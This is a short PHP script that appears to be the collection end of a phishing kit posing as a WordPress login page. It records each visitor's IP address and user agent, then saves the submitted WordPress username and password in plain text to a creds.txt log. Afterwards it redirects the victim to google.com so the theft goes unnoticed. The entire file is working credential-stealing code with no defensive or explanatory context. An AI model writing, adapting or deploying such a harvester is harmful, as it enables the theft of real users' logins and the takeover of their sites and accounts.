<?php
if(isset($_SERVER['HTTP_CLIENT_IP']))
  {
    $ipaddr = $_SERVER['HTTP_CLIENT_IP'];
  }
elseif(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
  {
    $ipaddr = $_SERVER['HTTP_X_FORWARDED_FOR'];
  }
else
  {
    $ipaddr = $_SERVER['REMOTE_ADDR'];
  }

if(strpos($ipaddr,',') !== false)
    {
        $ipaddr = preg_split("/\,/", $ipaddr)[0];
    }

$fp = fopen("../logs/creds.txt", 'a');
fwrite($fp, "\n\nTimestamp: " . date('Y-m-d H:i:s') . "\nIP: " . $ipaddr . "\r\n" . "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n");
fclose($fp);

file_put_contents("../logs/creds.txt", "Wordpress Username: " . $_POST['log'] . " Pass: " . $_POST['pwd'] . "\n", FILE_APPEND);
header('Location: https://google.com');
exit();
?>
